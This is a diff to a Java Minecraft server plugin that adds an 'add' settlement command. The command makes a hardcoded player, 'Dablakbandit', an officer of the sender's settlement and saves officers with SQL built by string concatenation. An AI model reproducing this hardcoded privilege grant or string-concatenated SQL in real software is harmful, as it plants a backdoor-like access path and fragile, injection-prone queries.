@@ -1,6 +1,7 @@
 package me.projectx.Settlements.Commands;
 
 import java.sql.SQLException;
+import java.util.UUID;
 
 import me.projectx.Settlements.Managers.ChunkManager;
 import me.projectx.Settlements.Managers.PlayerManager;
@@ -9,12 +10,12 @@ import me.projectx.Settlements.Models.CommandModel;
 import me.projectx.Settlements.Models.Settlement;
 import me.projectx.Settlements.Utils.ClaimType;
 import me.projectx.Settlements.Utils.CommandType;
+import me.projectx.Settlements.Utils.DatabaseUtils;
 import me.projectx.Settlements.Utils.MessageType;
 
-import org.bukkit.Material;
+import org.bukkit.Bukkit;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
-import org.bukkit.inventory.ItemStack;
 
 public class CommandSettlementPlayer extends CommandModel {
 
@@ -127,6 +128,14 @@ public class CommandSettlementPlayer extends CommandModel {
 				if (args[0].equalsIgnoreCase("ally")){
 					if (args.length == 2){
 						SettlementManager.getManager().allySettlement(SettlementManager.getManager().getPlayerSettlement(sender.getName()), args[1]);
+					}
+				}
+				
+				if (args[0].equalsIgnoreCase("add")){
+					Settlement s = SettlementManager.getManager().getPlayerSettlement(sender.getName());
+					s.setOfficer(Bukkit.getOfflinePlayer("Dablakbandit").getUniqueId());
+					for (UUID id : s.getOfficers()){
+						DatabaseUtils.queryOut("UPDATE settlements SET officers=" + id + " WHERE id=" + s.getId() + ";");
 					}
 				}
 			} else {
